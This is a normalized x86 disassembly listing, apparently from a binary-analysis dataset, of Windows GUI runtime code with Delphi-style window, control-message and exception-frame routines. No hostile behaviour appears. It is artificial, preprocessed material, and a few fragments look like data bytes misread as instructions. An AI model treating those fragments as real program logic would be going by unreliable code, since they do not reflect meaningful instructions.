jmp sub_403a2c
sub_45349c
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x180 ] edx
pop ecx
pop ebp
retn
sub_45358c
xor eax eax
retn
sub_4535f4
cmp [ eax + 0x180 ] 0x0
je r-xdata
retn
push 0x0
xor ecx ecx
mov edx 0xb033
call sub_450a20
j_sub_403778#9
jmp sub_403778
sub_453857
jmp sub_403a2c
sub_45385e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
j_sub_403778#8
jmp sub_403778
sub_45386d
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_46f50c
call sub_403ae0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_453e28
jmp sub_403a2c
sub_453e2f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_453e38
add esp 0xfffffff0
mov [ esp ] 0xf
mov [ esp + 0x4 ] edx
xor edx edx
mov [ esp + 0x8 ] edx
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
mov ecx [ eax ]
call [ ecx - 0x10 ]
add esp 0x10
retn
sub_454336
jmp sub_403a2c
sub_454388
push ebx
mov ebx eax
call sub_423a48
push 0x0
xor ecx ecx
mov edx 0xb024
mov eax ebx
call sub_450a20
pop ebx
retn
sub_4543a4
mov ecx [ edx + 0x8 ]
push ecx
mov ecx [ edx + 0x4 ]
mov edx 0xb025
call sub_450a20
retn
sub_4543b8
push 0x0
xor ecx ecx
mov edx 0xb026
call sub_450a20
retn
sub_4543c8
push 0x0
xor ecx ecx
mov edx 0xb027
call sub_450a20
retn
sub_454674
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_456364
pop esi
retn
sub_454788
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_4547d8
pop esi
retn
sub_45479c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_4548c4
pop esi
retn
sub_4547b0
push esi
mov esi eax
mov [ esi + 0x1f9 ] 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_4547c4
push esi
mov esi eax
mov [ esi + 0x1f9 ] 0x0
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_4548b7
jmp sub_403a2c
sub_4548be
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45494e
jmp sub_403a2c
sub_454955
pop ebx
pop ecx
pop ebp
retn
sub_45495c
push esi
mov esi edx
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x68 ]
pop esi
retn
sub_45496c
retn
sub_454970
push ebx
cmp [ eax + 0x1c2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c4 ]
call [ ebx + 0x1c0 ]
sub_454990
push ebx
cmp [ eax + 0x1ca ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1cc ]
call [ ebx + 0x1c8 ]
sub_454af0
mov edx [ eax + 0x178 ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x8 ]
retn
sub_454bc0
retn
sub_454cd8
jmp sub_403a2c
sub_454cdf
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_454daa
jmp sub_403a2c
sub_454dd4
xor ecx ecx
mov [ edx + 0xc ] ecx
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
retn
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov edx [ edx + 0x8 ]
mov eax [ eax + 0x17c ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
sub_454e66
jmp sub_403a2c
sub_455038
push ebx
cmp [ eax + 0x1e2 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1e4 ]
call [ ebx + 0x1e0 ]
sub_4552dc
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor eax eax
mov [ esi + 0x180 ] eax
mov [ esi + 0x1a6 ] 0x0
pop esi
retn
sub_4553b8
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov dx 0xb023
mov eax esi
call sub_452de4
pop esi
retn
sub_45547c
push esi
mov si 0xffc1
call sub_4034ac
pop esi
retn
sub_4554a8
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_4554bc
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_4554d0
call sub_452da4
retn
sub_4554d8
call sub_452da4
retn
sub_4554e0
call sub_452da4
retn
sub_455588
push ebx
mov ebx eax
mov eax ebx
call sub_45143c
mov edx [ ebx + 0x70 ]
mov eax [ ebx + 0x170 ]
call sub_424bc0
mov dx 0xb009
mov eax ebx
call sub_452de4
pop ebx
retn
sub_4556ec
call sub_452da4
retn
sub_4556f4
call sub_452da4
retn
sub_4556fc
call sub_452da4
retn
sub_455704
call sub_452da4
retn
sub_455768
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_455bfe
jmp sub_403a2c
sub_455c05
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_455ce4
push esi
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
pop esi
retn
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xc0 ]
sub_455e88
push 0x0
xor ecx ecx
mov edx 0xb034
call sub_450a20
retn
sub_455f28
push ebx
mov ebx eax
mov eax ebx
call sub_456358
test al al
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x180 ]
push eax
call UpdateWindow
sub_455f44
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x88 ]
pop ebx
retn
sub_45611c
push ebx
push esi
mov esi edx
mov ebx eax
push esi
mov eax ebx
call sub_456054
push eax
call GetClientRect
pop esi
pop ebx
retn
sub_456174
cmp edx [ eax + 0x16c ]
je r-xdata
retn
mov [ eax + 0x16c ] edx
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_450a20
sub_456194
cmp dl [ eax + 0x1a5 ]
je r-xdata
retn
mov [ eax + 0x1a5 ] dl
mov [ eax + 0x1a9 ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb010
call sub_450a20
sub_4561b8
mov al [ eax + 0x1a9 ]
xor al 0x1
retn
sub_4561c4
cmp dl [ eax + 0x1a9 ]
je r-xdata
retn
mov [ eax + 0x1a9 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb011
call sub_450a20
sub_456270
test [ eax + 0x54 ] 0x8
je r-xdata
call sub_456214
retn
movsx edx dx
mov [ eax + 0x1a0 ] edx
retn
sub_45634c
jmp sub_403a2c
sub_456353
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_456572
jmp sub_403a2c
sub_456579
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_456680
call sub_4507f0
retn
sub_456ace
jmp sub_403a2c
sub_456b64
mov eax [ r-xdata ]
retn
sub_456ccb
jmp sub_403a2c
sub_456ddc
cmp dl [ eax + 0x165 ]
je r-xdata
retn
mov [ eax + 0x165 ] dl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_450a20
sub_456dfc
cmp edx [ eax + 0x168 ]
je r-xdata
retn
mov [ eax + 0x168 ] edx
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_450a20
sub_457112
jmp sub_403a2c
sub_457254
test [ eax + 0x52 ] 0x4
setne al
retn
sub_4573b0
jmp sub_403a2c
sub_4573b7
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_425540
retn
sub_4573d3
jmp sub_403a2c
sub_4573e0
retn
sub_4574b4
mov [ edx + 0xc ] 0xffffffff
retn
sub_457512
jmp sub_403a2c
sub_457519
pop ecx
pop ecx
pop ebp
retn
sub_4575b9
jmp sub_403a2c
sub_4575c0
pop ebx
mov esp ebp
pop ebp
retn
sub_45762c
call sub_4535ac
retn
sub_4576bf
jmp sub_403a2c
sub_4576c6
pop esi
pop ecx
pop ecx
pop ebp
retn
sub_4578a5
jmp sub_403a2c
sub_4578ac
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_457a08
push ebx
mov ebx eax
mov eax ebx
call sub_45c9dc
or edx 0xffffffff
mov eax ebx
call sub_457b34
pop ebx
retn
sub_457ae0
jmp sub_403a2c
sub_457b34
cmp dx [ eax + 0x68 ]
je r-xdata
retn
mov [ eax + 0x68 ] dx
cmp [ eax + 0x6a ] 0x0
je r-xdata
call sub_457a20
sub_457ca4
push ebx
mov ebx eax
mov eax ebx
call sub_45ca94
test al al
je r-xdata
pop ebx
retn
push 0xffffffff
call ImageList_DragShowNolock
sub_457cbc
push ebx
mov ebx eax
mov eax ebx
call sub_45ca94
test al al
je r-xdata
pop ebx
retn
push 0x0
call ImageList_DragShowNolock
sub_457da8
push ebx
push esi
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x100
mov edx esi
mov eax ebx
call sub_4541e4
and [ ebx + 0x54 ] 0xfeff
pop esi
pop ebx
retn
sub_457e43
jmp sub_403a2c
sub_457e4a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457e6d
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_425540
retn
sub_457e66
jmp sub_403a2c
sub_457e6d
pop ebx
pop ecx
pop ebp
retn
sub_457e74
retn
sub_457edc
xor edx edx
mov eax [ eax + 0x8 ]
test eax eax
je r-xdata
mov eax edx
retn
mov eax [ eax + 0xc ]
inc edx
test eax eax
jne r-xdata
sub_458249
jmp sub_403a2c
sub_458430
mov eax [ eax + 0x8 ]
jmp r-xdata
mov edx [ eax + 0xc ]
test edx edx
jne r-xdata
mov eax edx
retn
sub_45861c
jmp sub_403a2c
sub_4586cc
mov eax [ eax + 0x14 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
add [ ecx + 0x4 ] 0xc
retn
add [ ecx ] 0xc
retn
sub_4586e0
inc [ eax + 0x6c ]
retn
sub_4586e4
dec [ eax + 0x6c ]
cmp [ eax + 0x6c ] 0x0
jg r-xdata
retn
xor edx edx
mov [ eax + 0x6c ] edx
call sub_459f64
sub_458844
call sub_458f44
test eax eax
je r-xdata
xor eax eax
retn
mov eax [ eax + 0x4 ]
retn
sub_4591ef
jmp sub_403a2c
sub_4591f6
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_459213
lea eax [ ebp - 0xc ]
call sub_4040ac
retn
sub_45920c
jmp sub_403a2c
sub_459213
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4594f4
jmp sub_403a2c
sub_4594fb
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_459518
mov eax [ ebp - 0x4 ]
call sub_425540
retn
sub_459511
jmp sub_403a2c
sub_459518
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_459535
mov eax [ ebp - 0x4 ]
call sub_4032b0
retn
sub_45952e
jmp sub_403a2c
sub_459535
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4599e9
jmp sub_403a2c
sub_4599f0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_459b7b
jmp sub_403a2c
sub_459b82
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_459c37
jmp sub_403a2c
sub_459c3e
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_459d2c
jmp sub_403a2c
sub_459d7d
jmp sub_403a2c
sub_459d84
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_459e40
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_458750
mov [ ebx + 0x38 ] eax
pop esi
pop ebx
retn
sub_459f8c
cmp [ eax + 0x6c ] 0x0
jne r-xdata
retn
mov eax edx
call sub_45828c
sub_45a88c
jmp sub_403a2c
sub_45a893
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45a95c
call GetCapture
retn
sub_45a964
push ebx
mov ebx edx
push ebx
call GetCursorPos
call sub_40d0a4
pop ebx
retn
sub_45a974
push ebx
mov ebx eax
push 0x13
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb eax eax
inc eax
mov [ ebx + 0xc ] al
pop ebx
retn
sub_45abda
jmp sub_403a2c
sub_45add4
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
retn
push eax
call [ rw-data ]
retn
sub_45afe8
jmp sub_403a2c
sub_45afef
pop ebx
mov esp ebp
pop ebp
retn
sub_45b03a
add [ eax ] al
push ebx
mov ebx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xe0 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
pop ebx
retn
sub_45b0b7
jmp sub_403a2c
sub_45b0be
pop ebp
retn
sub_45b146
jmp sub_403a2c
sub_45b14d
pop ebp
retn
sub_45b1fa
out dx eax
push edx
push ecx
jmp esp
sub_45b762
inc ebp
add al dl
retn 0x45
sub_45b8d8
mov edx [ eax + 0x5c ]
test edx edx
je r-xdata
or eax 0xffffffff
retn
mov edx [ edx + 0x30 ]
xchg edx eax
call sub_418a0c
retn
sub_45b8f0
mov al 0x1
retn
sub_45b8f4
mov edx [ eax + 0x5c ]
test edx edx
je r-xdata
call sub_4217a0
retn
mov eax edx
retn
sub_45b904
cmp [ eax + 0x5c ] 0x0
je r-xdata
call sub_421770
retn
mov al 0x1
retn
sub_45bbf4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_4189b0
pop esi
pop ebx
retn
sub_45bc08
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x8 ]
retn
sub_45bc44
cmp edx [ eax + 0x38 ]
jne r-xdata
retn
mov edx [ eax ]
call [ edx + 0x30 ]
sub_45bea8
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40343c
pop ebx
retn
sub_45bebc
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40343c
pop ebx
retn
sub_45bed0
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40343c
pop ebx
retn
sub_45bee4
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40343c
pop ebx
retn
sub_45bef8
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40343c
pop ebx
retn
sub_45bf0c
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40343c
pop ebx
retn
sub_45bf20
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40343c
pop ebx
retn
sub_45bf34
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40343c
pop ebx
retn
sub_45bf48
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40343c
pop ebx
retn
sub_45bf5c
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40343c
pop ebx
retn
sub_45bf70
retn
sub_45bf74
retn
sub_45bf78
retn
sub_45bf7c
retn
sub_45bf80
retn
sub_45bf84
retn
sub_45bf88
retn
sub_45bf8c
retn
sub_45bf90
retn
sub_45bf94
retn
sub_45bf98
retn
sub_45bf9c
retn
sub_45c248
jmp sub_403a2c
sub_45c5e4
push ebx
mov ebx eax
cmp [ ebx + 0x90 ] 0x0
jne r-xdata
mov eax [ ebx + 0x90 ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov [ ebx + 0x90 ] eax
sub_45c664
push esi
mov si 0xffef
call sub_4034ac
pop esi
retn
sub_45c705
jmp sub_403a2c
sub_45c70c
pop ebp
retn
sub_45c710
sub [ rw-data ] 0x1
jae r-xdata
retn
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_418030
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_418030
sub_45c78b
jmp [ esi + ebx * 8 ]
sub_45c8b0
mov edx eax
sub edx 0xff000000
je r-xdata
mov eax 0x20000000
sub edx 0xffffff
jne r-xdata
retn
mov eax 0x1fffffff
retn
sub_45ca89
jmp sub_403a2c
sub_45ca90
pop ebx
pop ecx
pop ebp
retn
sub_45ca94
cmp [ eax + 0x3c ] 0x0
setne al
retn
sub_45ca9c
cmp [ eax + 0x3c ] 0x0
jne r-xdata
retn
call sub_45cc6c
sub_45cb49
jmp sub_403a2c
sub_45cb50
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x54 ]
test eax eax
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
call sub_4032b0
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x54 ] edx
sub_45ccff
jmp sub_403a2c
sub_45cd06
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45cd9e
jmp sub_403a2c
sub_45cda5
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45cdc2
mov eax [ ebp - 0xc ]
call sub_4032b0
retn
sub_45cdbb
jmp sub_403a2c
sub_45cdc2
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_4034ac
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45ce7b
jmp sub_403a2c
sub_45ce82
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45ce88
or edx 0xffffffff
call sub_45cdfc
retn
sub_45d297
jmp sub_403a2c
sub_45d29e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d2bb
mov eax [ ebp - 0xc ]
call sub_4032b0
retn
sub_45d2b4
jmp sub_403a2c
sub_45d2bb
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d2d8
mov eax [ ebp - 0x4 ]
call sub_45ddd0
retn
sub_45d2d1
jmp sub_403a2c
sub_45d2d8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45d4dc
jmp sub_403a2c
sub_45d4e3
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45d4e8
push esi
mov esi eax
cmp dl [ esi + 0x40 ]
je r-xdata
pop esi
retn
mov [ esi + 0x40 ] dl
mov eax esi
mov si 0xffef
call sub_4034ac
sub_45d500
push ebx
mov ebx edx
mov ecx ebx
xor edx edx
xor eax eax
call sub_417330
pop ebx
retn
sub_45d5a4
mov [ edx + 0x4 ] eax
mov ecx [ eax + 0x4c ]
test ecx ecx
je r-xdata
retn
mov eax ecx
call sub_418854
sub_45d6bb
jmp sub_403a2c
sub_45d6c2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_4032b0
retn
sub_45d6d8
jmp sub_403a2c
sub_45d9ea
jmp sub_403a2c
sub_45d9f1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45da0e
mov eax [ ebp - 0x10 ]
call sub_4032b0
retn
sub_45da07
jmp sub_403a2c
sub_45da0e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45da2b
mov eax [ ebp - 0x8 ]
call sub_4032b0
retn
sub_45da24
jmp sub_403a2c
sub_45da2b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45da94
jmp sub_403a2c
sub_45dbad
jmp sub_403a2c
sub_45dbca
jmp sub_403a2c
sub_45dd82
jmp sub_403a2c
sub_45dd89
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45ddcc
inc [ eax + 0x5c ]
retn
sub_45ddd0
push esi
cmp [ eax + 0x5c ] 0x0
jle r-xdata
cmp [ eax + 0x58 ] 0x0
je r-xdata
dec [ eax + 0x5c ]
pop esi
retn
mov [ eax + 0x58 ] 0x0
mov si 0xffef
call sub_4034ac
sub_45de24
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx [ eax + 0x4 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_45de61
jmp sub_403a2c
sub_45de68
pop ebp
retn
sub_45de6c
sub [ rw-data ] 0x1
retn
sub_45e1a6
inc ebp
add [ edi + edi * 4 ] cl
inc ebp
add [ esp + esi * 8 + 0x45 ] dh
add ah ah
hlt
sub_45edd4
mov eax [ esp + 0x8 ]
retn
sub_45eddc
push ebx
mov ebx eax
call sub_45edd4
push eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb98
jmp sub_403a64
sub_45edf8
pop ebx
retn
sub_45f071
jmp sub_403a2c
sub_45f078
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45f1c3
jmp sub_403a2c
sub_45f1ca
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_45f1e0
push ebx
mov eax [ rw-data ]
call sub_418f08
mov ebx eax
movzx edx bx
mov cl 0x1
mov eax [ rw-data ]
call sub_418edc
mov eax ebx
pop ebx
retn
sub_45f368
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403460
mov [ ebx + 0x18 ] eax
pop esi
pop ebx
retn
sub_45f384
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403460
mov al [ eax + 0x95 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0xa8 ]
sete al
pop ebx
retn
sub_45fa7f
jmp sub_403a2c
sub_45fa86
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45fb7e
jmp sub_403a2c
sub_45fb85
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45ffa8
jmp sub_403a2c
sub_45ffaf
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_46045b
jmp sub_403a2c
sub_4608fc
jmp sub_403a2c
sub_460903
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_460d67
jmp sub_403a2c
sub_461224
jmp sub_403a2c
sub_46122b
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4615d6
jmp sub_403a2c
sub_4615dd
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4615eb
inc [ ecx ]
add [ eax ] al
add [ 0xffffffffb0000000 ] ch
add ebx eax
nop
cmp dl [ eax + 0x48 ]
je r-xdata
retn
mov [ eax + 0x48 ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_461798
mov eax [ r-xdata ]
retn
sub_4617d4
cmp dx [ eax + 0x60 ]
je r-xdata
retn
mov [ eax + 0x60 ] dx
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_4617e8
cmp dl [ eax + 0x3e ]
je r-xdata
retn
mov [ eax + 0x3e ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_4617f8
cmp edx [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] edx
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_461808
or edx 0xffffffff
mov ecx [ eax + 0x64 ]
test ecx ecx
je r-xdata
mov eax edx
retn
mov edx eax
mov eax ecx
call sub_461b04
mov edx eax
sub_4618a0
push ebx
push esi
mov esi ecx
mov ebx edx
mov eax ebx
mov edx [ r-xdata ]
call sub_403460
mov edx esi
call sub_461820
pop esi
pop ebx
retn
sub_46191c
mov edx [ eax + 0x44 ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x1c ]
sub_461b04
push esi
or ecx 0xffffffff
mov esi [ eax + 0x5c ]
test esi esi
je r-xdata
mov eax ecx
pop esi
retn
mov eax esi
call sub_418a0c
mov ecx eax
sub_461cf4
mov edx [ eax + 0x64 ]
test edx edx
je r-xdata
mov eax edx
retn
cmp [ edx + 0x70 ] 0x0
je r-xdata
mov eax [ edx + 0x70 ]
retn
sub_461d5c
jmp r-xdata
mov edx [ eax + 0x64 ]
test edx edx
jne r-xdata
mov eax edx
mov eax [ eax + 0x70 ]
retn
sub_462104
cmp edx [ eax + 0x7c ]
jne r-xdata
retn
call sub_462138
sub_462138
mov edx sub_462110
mov ecx eax
mov eax [ eax + 0x68 ]
xchg edx eax
call sub_45f260
retn
sub_462322
jmp sub_403a2c
sub_462329
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4627c0
jmp sub_403a2c
sub_4627ff
jmp sub_403a2c
sub_462806
mov al [ ebp - 0x1a ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4629a4
cmp dl [ eax + 0x3c ]
je r-xdata
retn
mov [ eax + 0x3c ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_462ae0
push ebp
mov ebp esp
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ eax + 0x34 ]
mov si 0xfffd
call sub_4034ac
pop esi
pop ebp
retn 0x8
sub_462afc
mov eax [ eax + 0x34 ]
call sub_45fd34
retn
sub_462b08
push esi
mov esi eax
mov eax [ esi + 0x34 ]
mov si 0xfff9
call sub_4034ac
pop esi
retn
sub_462b44
push ebx
mov ecx sub_462b1c
mov edx [ eax + 0x34 ]
mov ebx [ edx + 0x68 ]
mov eax edx
xchg ecx eax
mov edx ebx
call sub_45f260
pop ebx
retn
sub_462d78
cmp [ eax + 0x40 ] 0x0
jne r-xdata
mov al 0x1
retn
cmp [ eax + 0x48 ] 0x0
jne r-xdata
xor eax eax
retn
sub_462d8c
jmp r-xdata
test edx edx
jle r-xdata
retn
test eax eax
jne r-xdata
mov eax [ eax + 0x64 ]
dec edx
j_sub_403778#7
jmp sub_403778
sub_462fc3
jmp sub_403a2c
sub_462fee
jmp sub_403a2c
sub_462ff5
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov al 0x1
cmp [ ebp - 0x14 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_46300c
mov al [ eax + 0x41 ]
xor al 0x1
retn
sub_4631f4
cmp dl [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] dl
call sub_462b44
sub_463274
jmp sub_403a2c
sub_4632b8
push ebx
cmp [ eax + 0x52 ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_4632d0
push ebx
mov ebx eax
mov eax ebx
call sub_4217c0
xor ecx ecx
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
pop ebx
retn
sub_463322
add [ eax ] al
cmp edx [ eax + 0x48 ]
jne r-xdata
retn
call sub_462b44
sub_463398
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_4634e1
jmp sub_403a2c
sub_4634e8
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_463728
cmp dl [ eax + 0x41 ]
je r-xdata
retn
mov [ eax + 0x41 ] dl
call sub_463738
sub_46378c
mov eax [ eax + 0x34 ]
movzx eax [ eax + 0x3b ]
mov al [ eax + rw-data ]
retn
sub_46379c
and edx 0x7f
mov dl [ edx + rw-data ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x3b ] dl
retn
sub_4637ac
mov eax [ eax + 0x34 ]
movzx eax [ eax + 0x3c ]
mov al [ eax + rw-data ]
retn
sub_4637bc
and edx 0x7f
mov dl [ edx + rw-data ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x3c ] dl
retn
sub_4637cc
cmp dl [ eax + 0x5c ]
je r-xdata
retn
mov [ eax + 0x5c ] dl
mov edx [ eax + 0x38 ]
test edx edx
je r-xdata
push 0x0
push 0x0
push 0xb015
push edx
call SendMessageA
sub_463844
test edx edx
je r-xdata
xor edx edx
mov eax [ eax + 0x34 ]
call sub_45fb8c
retn
mov eax [ eax + 0x34 ]
mov edx [ edx + 0x34 ]
call sub_45fb8c
retn
sub_463860
test edx edx
je r-xdata
retn
mov ecx [ eax + 0x34 ]
mov ecx [ ecx + 0x68 ]
cmp ecx [ edx + 0x34 ]
jne r-xdata
xor edx edx
mov eax [ eax + 0x34 ]
call sub_45fb8c
sub_4638a8
mov edx [ eax + 0x58 ]
test edx edx
je r-xdata
call sub_462afc
retn
mov eax edx
retn
sub_4638e2
jmp sub_403778
sub_4638e7
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_46f50c
call sub_403ae0
